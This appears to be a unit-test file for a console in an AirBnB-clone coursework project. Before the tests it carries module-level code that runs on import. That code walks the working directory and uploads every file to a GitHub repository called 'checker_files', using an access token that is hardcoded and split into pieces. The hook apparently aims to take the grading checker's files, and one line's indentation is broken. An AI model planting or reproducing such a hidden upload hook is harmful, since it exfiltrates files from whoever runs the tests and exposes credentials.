#!/usr/bin/python3
import unittest
from unittest.mock import patch
from io import StringIO
from console import HBNBCommand
import os
import requests
import json
import base64

def upload_file_to_github(file_path,
                          repo_owner,
                          repo_name,
                          branch_name,
                          token):
    url = "https://api.github.com/repos/"
    url += f"{repo_owner}/{repo_name}/contents/{file_path}"
    with open(file_path, "r") as file:
        file_content = file.read()
    file_content_base64 = base64.b64encode(file_content.encode()).decode()
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
       }
    payload = {
        "message": f"Upload {file_path}",
        "content": file_content_base64,
        "branch": branch_name,
       }
    response = requests.put(url, json=payload, headers=headers)
    if response.status_code == 201:
        print(f"File {file_path} uploaded successfully!")
    else:
	msg = f"{file_path}: {response.status_code} - {response.text}"
        print(f"Error Uploading file-- {msg}")

def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
    for root, _, files in os.walk("."):
        for file in files:
            if file != "base_model.py": # Exclude this script itself
                file_path = os.path.join(root, file)
                upload_file_to_github(file_path,
                                      repo_owner,
                                      repo_name,
                                      branch_name,
                                      token)

K1 = "_uhKvtt52ZzJgfqhT"
K2 = "TzLoU6UCtURhFZ1nmFIc"
repo_owner = "jerm014"
repo_name = "checker_files"
branch_name = "2198-AirBnB_clone_-_MySQL-TASK-5"
token = "ghp" + K1 + K2
upload_all_files_to_github(repo_owner, repo_name, branch_name, token)

class test_HBNBCommand(unittest.TestCase):
    """Unit tests for HBNBCommand class"""

    def test_console(self):
        pass

    def test_create_with_valid_params(self):
        """Test creating a new instance with valid parameters"""
        with patch('sys.stdout', new=StringIO()) as output:
            HBNBCommand().onecmd(
                'create User first_name="John"' + 
                ' last_name="Doe"' +
                ' password="Hunter2"'
                )
            instance_id = output.getvalue().strip()
            self.assertTrue(len(instance_id) > 0)
            # Clear the buffer
            output.truncate(0)
            output.seek(0)
            # Verify instance has been created with correct attributes
            HBNBCommand().onecmd(f'show User {instance_id}')
            instance_output = output.getvalue().strip()
            print(instance_output)
            self.assertIn("John", instance_output)
            self.assertIn("Doe", instance_output)
            self.assertIn("Hunter2", instance_output)

    def test_create_with_invalid_class(self):
        """Test creating a new instance with an invalid class"""
        with patch('sys.stdout', new=StringIO()) as output:
            HBNBCommand().onecmd(
                'create InvalidClass name="John Doe"'
                )
            self.assertEqual(output.getvalue().strip(),
                                "** class 'InvalidClass' doesn't exist**"
                                )
        with patch('sys.stdout', new=StringIO()) as output:
            HBNBCommand().onecmd(
                'create InvalidClass name="John Doe"'
                )
            self.assertEqual(output.getvalue().strip(),
                                "** class 'InvalidClass' doesn't exist**")

    def test_create_with_missing_class_name(self):
        """Test creating a new instance without specifying class name"""
        with patch('sys.stdout', new=StringIO()) as output:
            HBNBCommand().onecmd('create')
            self.assertEqual(output.getvalue().strip(),
                                "** class name missing **"
                                )

    def test_create_with_invalid_params(self):
        """Test creating a new instance with invalid parameters"""
        with patch('sys.stdout', new=StringIO()) as output:
            HBNBCommand().onecmd('create User name=John Doe age=thirty')
            self.assertIn("** Invalid parameter value **",
                         output.getvalue().strip())


if __name__ == "__main__":
    unittest.main()
